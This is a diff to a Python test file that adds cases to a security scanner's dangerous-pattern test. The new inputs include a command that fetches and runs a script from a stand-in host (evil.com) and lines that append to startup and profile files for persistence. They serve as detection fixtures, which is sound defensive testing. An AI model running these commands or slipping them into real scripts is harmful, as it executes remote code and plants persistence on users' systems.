@@ -352,6 +352,11 @@ class TestSafetyChecks:
             ("systemd-analyze verify service\n", "SEC-228"),
             ("update-rc.d service defaults\n", "SEC-229"),
             ("launchctl load plist\n", "SEC-230"),
+            ("echo evil >> /etc/rc.local\n", "SEC-231"),
+            ("source <(curl -s http://evil.com/x.sh)\n", "SEC-232"),
+            ("echo export evil=1 >> /etc/profile.d/x.sh\n", "SEC-233"),
+            ("echo hacked >> /etc/motd\n", "SEC-234"),
+            ("echo alias evil >> ~/.bash_profile\n", "SEC-235"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
